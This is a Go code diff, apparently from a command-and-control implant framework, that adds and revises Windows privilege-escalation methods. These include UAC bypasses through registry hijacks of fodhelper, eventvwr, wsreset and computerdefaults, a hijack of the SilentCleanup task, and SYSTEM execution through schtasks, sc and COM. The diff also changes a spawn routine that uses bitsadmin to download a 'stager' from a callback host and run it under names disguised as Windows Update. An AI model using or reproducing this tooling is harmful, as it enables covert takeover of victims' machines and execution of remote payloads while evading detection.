@@ -16,6 +16,7 @@ type LOLBinMethod struct {
 	Commands    []string  // Native Windows commands (no PowerShell)
 	Detection   string    // How to detect if it worked
 	NoiseLevel  string    // "Low", "Medium", "High"
+	CheckResult string    // Optional: regex pattern to check in command output for success
 }
 
 // GetUserToAdminMethods returns LOLBin methods for User->Admin escalation
@@ -28,7 +29,7 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 			Commands: []string{
 				`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "%s" /f`,
 				`start eventvwr.exe`,
-				`ping 127.0.0.1 -n 4 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
 				`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f`,
 			},
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
@@ -42,7 +43,7 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
 				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
 				`fodhelper.exe`,
-				`ping 127.0.0.1 -n 3 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
 			},
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
@@ -56,7 +57,7 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
 				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
 				`computerdefaults.exe`,
-				`ping 127.0.0.1 -n 3 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
 			},
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
@@ -69,7 +70,7 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 			Commands: []string{
 				`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "%s" /f`,
 				`sdclt.exe /kickoffelev`,
-				`ping 127.0.0.1 -n 3 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f`,
 			},
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
@@ -82,7 +83,7 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 			Commands: []string{
 				`schtasks /create /tn "WindowsUpdateCheck" /tr "cmd.exe /c \"%s\"" /sc onlogon /ru SYSTEM /f`,
 				`schtasks /run /tn "WindowsUpdateCheck"`,
-				`ping 127.0.0.1 -n 3 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`schtasks /delete /tn "WindowsUpdateCheck" /f`,
 			},
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
@@ -95,7 +96,7 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 			Commands: []string{
 				`schtasks /create /tn "DiskCleanupEscalation" /tr "cmd.exe /c \"%s\"" /sc onlogon /ru SYSTEM /f`,
 				`schtasks /run /tn "DiskCleanupEscalation"`,
-				`ping 127.0.0.1 -n 3 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`schtasks /delete /tn "DiskCleanupEscalation" /f`,
 			},
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
@@ -116,6 +117,58 @@ func (l *LOLBinEscalation) GetUserToAdminMethods() []LOLBinMethod {
 			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
 			NoiseLevel: "Low",
 		},
+		{
+			Name:           "WSReset Registry Hijack",
+			Description:    "Exploits wsreset.exe auto-elevation via registry hijack",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\AppX82a6GwReNeqSDgT2LMq8qTqK8zqDTP8\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\AppX82a6GwReNeqSDgT2LMq8qTqK8zqDTP8\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`wsreset.exe`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\AppX82a6GwReNeqSDgT2LMq8qTqK8zqDTP8\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "SilentCleanup Task Hijack",
+			Description:    "Hijacks SilentCleanup scheduled task that runs as admin",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%s" /f`,
+				`schtasks /run /tn "Microsoft\Windows\DiskCleanup\SilentCleanup"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%%windir%%\system32\cleanmgr.exe /autoclean /d %%c:%%" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Medium",
+		},
+		{
+			Name:           "Rundll32 ShellExecute",
+			Description:    "Uses rundll32 to execute elevated code via ShellExecute",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`rundll32.exe shell32.dll,ShellExec_RunDLL "%s"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 2 >nul"`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
+		{
+			Name:           "ComputerDefaults Alternative",
+			Description:    "Alternative computerdefaults.exe execution method",
+			EscalationType: "User->Admin",
+			Commands: []string{
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "%s" /f`,
+				`reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f`,
+				`cmd.exe /c "start computerdefaults.exe"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
+				`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f`,
+			},
+			Detection:  `whoami /groups | findstr "S-1-5-32-544"`,
+			NoiseLevel: "Low",
+		},
 	}
 }
 
@@ -129,7 +182,7 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Commands: []string{
 				`schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance" /tr "%s" /sc onlogon /ru SYSTEM /f`,
 				`schtasks /run /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance"`,
-				`ping 127.0.0.1 -n 4 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
 				`schtasks /delete /tn "Microsoft\Windows\UpdateOrchestrator\SystemMaintenance" /f`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
@@ -142,7 +195,7 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Commands: []string{
 				`sc create "MicrosoftUpdateService" binPath= "%s" type= own start= demand error= normal`,
 				`sc start "MicrosoftUpdateService"`,
-				`ping 127.0.0.1 -n 4 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
 				`sc query "MicrosoftUpdateService" | findstr "RUNNING"`,
 				`sc stop "MicrosoftUpdateService"`,
 				`sc delete "MicrosoftUpdateService"`,
@@ -159,13 +212,18 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Low",
+			CheckResult: "ReturnValue.*=.*0", // WMI ReturnValue 0 = success, non-zero = failure
 		},
 		{
-			Name:           "WinRM Exec as SYSTEM",
-			Description:    "Uses WinRM to execute command as SYSTEM",
+			Name:           "Token Impersonation via Service",
+			Description:    "Uses service token impersonation to run as SYSTEM",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`powershell -Command "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '%s'"`,
+				`sc create "UpdateService" binPath= "%s" type= own start= demand error= normal`,
+				`sc start "UpdateService"`,
+				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
+				`sc stop "UpdateService"`,
+				`sc delete "UpdateService"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Low",
@@ -175,9 +233,9 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Uses COM object to execute as SYSTEM",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`reg add "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /d "%s" /f`,
+				`reg add "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /ve /d "%s" /f`,
 				`rundll32.exe shell32.dll,ShellExec_RunDLL "%s"`,
-				`ping 127.0.0.1 -n 3 >nul`,
+				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /f`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
@@ -259,17 +317,25 @@ func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv s
 	// Generate a command that spawns a new beacon using only native Windows tools
 	// No PowerShell, no suspicious downloads, uses legitimate Windows components
 	
-	payload := l.GenerateFilelessPayload(callbackURL)
+	// For spawning, we'll use a simpler approach - just download and execute
+	// Use bitsadmin to download the stager
+	tempFile := `%TEMP%\WindowsUpdate.exe`
+	downloadCmd := fmt.Sprintf(`bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s"`, callbackURL, tempFile)
+	
+	// Execute command - use cmd.exe /c to wrap if needed
+	execCmd := fmt.Sprintf(`start /b "" "%s"`, tempFile)
 	
 	if targetPriv == "system" {
-		// For SYSTEM, use a scheduled task approach (cleaner than service creation)
-		// Use a benign-looking task name
-		return fmt.Sprintf(`schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "%s" /sc onlogon /ru SYSTEM /f && schtasks /run /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" && timeout /t 2 /nobreak >nul && schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /f`, payload)
+		// For SYSTEM, use a scheduled task approach
+		// Combine download and execute into one command string
+		// Use cmd.exe /c to chain commands properly
+		combinedCmd := fmt.Sprintf(`cmd.exe /c "%s && %s"`, downloadCmd, execCmd)
+		return fmt.Sprintf(`schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "%s" /sc onlogon /ru SYSTEM /f`, combinedCmd)
 	}
 	
 	// For Admin, use start command with background execution
-	// This looks like normal process spawning
-	return fmt.Sprintf(`start /b "" %s`, payload)
+	// Wrap in cmd.exe /c for proper command chaining
+	return fmt.Sprintf(`cmd.exe /c "%s && %s"`, downloadCmd, execCmd)
 }
 
 // DetectPrivilegeLevel uses native Windows commands to detect privilege level
